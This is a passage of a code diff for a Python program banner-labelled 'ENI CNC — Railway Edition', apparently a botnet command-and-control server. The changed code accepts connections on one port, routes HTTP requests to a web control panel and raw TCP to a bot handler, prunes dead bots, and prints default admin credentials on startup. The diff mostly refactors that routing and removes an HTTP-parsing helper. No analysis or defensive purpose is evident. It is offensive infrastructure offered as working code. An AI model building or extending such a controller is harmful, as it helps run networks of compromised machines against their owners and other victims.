-# ——— main ——————————————————————————————————————————————————————————————
-start_time = time.time()
+# ═══════════════════════════════════════════════════════════════════
+# CLEANUP
+# ═══════════════════════════════════════════════════════════════════
 
 def cleanup_loop():
     """Remove dead bots."""
@@ -644,33 +707,31 @@ def cleanup_loop():
                     except: pass
                     del bots[bid]
 
+# ═══════════════════════════════════════════════════════════════════
+# MAIN SERVER
+# ═══════════════════════════════════════════════════════════════════
 
 class MultiplexServer:
-    """
-    Single socket that detects protocol and routes accordingly:
-      - HTTP → Flask-style web handler
-      - Bot TCP → bot handler
-    """
+    """Single-port server. Protocol detects, routes HTTP vs bot."""
 
     def __init__(self, host='0.0.0.0', port=8080):
-        self.host = host
-        self.port = port
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        self.host = host
+        self.port = port
 
     def start(self):
         self.sock.bind((self.host, self.port))
         self.sock.listen(512)
         self.sock.settimeout(1.0)
 
-        print(f"\n  ╔══════════════════════════════════════════╗")
-        print(f"  ║   ENI CNC — Railway Edition             ║")
-        print(f"  ║   listening on 0.0.0.0:{self.port}           ║")
-        print(f"  ║   protocol: HTTP (web panel) + raw TCP  ║")
-        print(f"  ║   default login: {ADMIN_USER} / {ADMIN_PASS}           ║")
-        print(f"  ╚══════════════════════════════════════════╝")
-        print(f"")
+        print(f"\n  [ENI CNC — Railway Edition]")
+        print(f"  listening: 0.0.0.0:{self.port}")
+        print(f"  protocol:  HTTP (web panel) + raw TCP (bots)")
+        print(f"  login:     {ADMIN_USER} / {ADMIN_PASS}")
+        print(f"  db:        {DB_PATH}")
+        sys.stdout.flush()
 
         threading.Thread(target=cleanup_loop, daemon=True).start()
 
@@ -682,7 +743,6 @@ class MultiplexServer:
             except Exception:
                 break
 
-            # peek at first bytes to detect protocol
             conn.settimeout(2.0)
             try:
                 first_bytes = conn.recv(4096, socket.MSG_PEEK)
@@ -695,96 +755,14 @@ class MultiplexServer:
             proto = detect_protocol(first_bytes)
 
             if proto == 'http':
-                # handle HTTP in a thread using BaseHTTPRequestHandler
-                threading.Thread(
-                    target=self._handle_http, args=(conn, addr),
-                    daemon=True
-                ).start()
+                threading.Thread(target=handle_http, args=(conn, addr), daemon=True).start()
             else:
-                # handle bot connection
-                threading.Thread(
-                    target=handle_bot, args=(conn, addr),
-                    daemon=True
-                ).start()
+                threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
 
-    def _handle_http(self, conn, addr):
-        """Convert a raw socket into an HTTP handler request."""
-        try:
-            # Create a pair of connected sockets to bridge the raw conn
-            # into BaseHTTPRequestHandler which expects a proper socket
-            import io
+# ═══════════════════════════════════════════════════════════════════
+# ENTRYPOINT
+# ═══════════════════════════════════════════════════════════════════
 
-            # Read the HTTP request from the raw socket
-            conn.settimeout(30)
-            request_data = b''
-            while True:
-                try:
-                    chunk = conn.recv(4096)
-                    if not chunk:
-                        break
-                    request_data += chunk
-                    if b'\r\n\r\n' in request_data:
-                        # Check for Content-Length to read body
-                        headers_end = request_data.find(b'\r\n\r\n')
-                        headers = request_data[:headers_end].decode('utf-8', errors='ignore')
-                        cl_match = re.search(r'Content-Length:\s*(\d+)', headers, re.IGNORECASE)
-                        if cl_match:
-                            content_length = int(cl_match.group(1))
-                            body_start = headers_end + 4
-                            body_so_far = len(request_data) - body_start
-                            while body_so_far < content_length:
-                                chunk = conn.recv(min(4096, content_length - body_so_far))
-                                if not chunk:
-                                    break
-                                request_data += chunk
-                                body_so_far += len(chunk)
-                        break
-                except socket.timeout:
-                    break
-
-            if not request_data:
-                conn.close()
-                return
-
-            # Parse and handle
-            request_line = request_data.split(b'\r\n')[0].decode('utf-8', errors='ignore')
-            parts = request_line.split()
-            if len(parts) < 2:
-                conn.close()
-                return
-
-            method, path, _ = parts
-
-            handler = CNCWebHandler(request_data, conn)
-            handler.path = path
-            handler.headers = self._parse_headers(request_data)
-            handler.requestline = request_line
-
-            if method == 'GET':
-                handler.do_GET()
-            elif method == 'POST':
-                handler.do_POST()
-
-        except Exception as e:
-            pass
-        finally:
-            try: conn.close()
-            except: pass
-
-    def _parse_headers(self, request_data):
-        """Quick header parser — returns a dict-like object."""
-        headers = {}
-        header_section = request_data.split(b'\r\n\r\n')[0]
-        lines = header_section.split(b'\r\n')[1:]  # skip request line
-        for line in lines:
-            if b':' in line:
-                key, val = line.split(b':', 1)
-                headers[key.decode('utf-8', errors='ignore').strip().lower()] = \
-                    val.decode('utf-8', errors='ignore').strip()
-        return headers
-
-
-# ——— entrypoint ————————————————————————————————————————————————————————
 if __name__ == '__main__':
     server = MultiplexServer(port=PORT)
     try:
